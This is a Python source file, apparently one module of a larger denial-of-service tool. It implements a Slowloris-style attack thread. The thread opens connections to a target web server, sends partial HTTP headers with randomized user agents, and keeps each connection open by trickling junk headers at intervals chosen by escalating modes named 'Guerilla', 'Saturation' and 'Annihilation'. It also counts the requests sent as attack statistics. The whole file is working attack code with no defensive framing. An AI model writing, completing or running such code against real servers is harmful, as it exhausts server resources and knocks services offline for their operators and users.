import threading
import socket
import random
import time
from urllib.parse import urlparse

import config
from utils.network import get_random_user_agent

class SlowPipe(threading.Thread):
    def __init__(self, target_url, mode):
        super().__init__()
        self.daemon = True
        self.target = urlparse(target_url)
        self.mode = mode
        self.connection = None
        self.keep_alive_headers = [
            f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"),
            f"X-b: {random.randint(1, 5000)}\r\n".encode("utf-8"),
            f"X-c: {random.randint(1, 5000)}\r\n".encode("utf-8"),
        ]

    def get_attack_params(self):
        sleep_interval = 15
        if self.mode == "Guerilla":
            sleep_interval = 25
        elif self.mode == "Saturation":
            sleep_interval = 10
        elif self.mode == "Annihilation":
            sleep_interval = 5
        return sleep_interval

    def build_initial_headers(self):
        headers = [
            f"GET {self.target.path or '/'} HTTP/1.1",
            f"Host: {self.target.netloc}",
            f"User-Agent: {get_random_user_agent()}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: vi-VN,en-us;q=0.5",
            "Connection: keep-alive"
        ]
        return "\r\n".join(headers) + "\r\n"

    def run(self):
        config.attack_stats["active_threads"] += 1
        sleep_interval = self.get_attack_params()

        while not config.stop_event.is_set():
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.settimeout(5)
                port = self.target.port or (443 if self.target.scheme == 'https' else 80)
                self.connection.connect((self.target.netloc, port))
                
                initial_packet = self.build_initial_headers().encode("utf-8")
                self.connection.send(initial_packet)
                
                config.attack_stats["requests_sent"] += 1
                config.attack_stats["http_ok"] += 1

                while not config.stop_event.is_set():
                    try:
                        self.connection.send(random.choice(self.keep_alive_headers))
                        time.sleep(sleep_interval)
                    except socket.error:
                        config.attack_stats["connect_error"] += 1
                        break
            except socket.error:
                config.attack_stats["connect_error"] += 1
            finally:
                if self.connection:
                    self.connection.close()
                time.sleep(1)

        config.attack_stats["active_threads"] -= 1

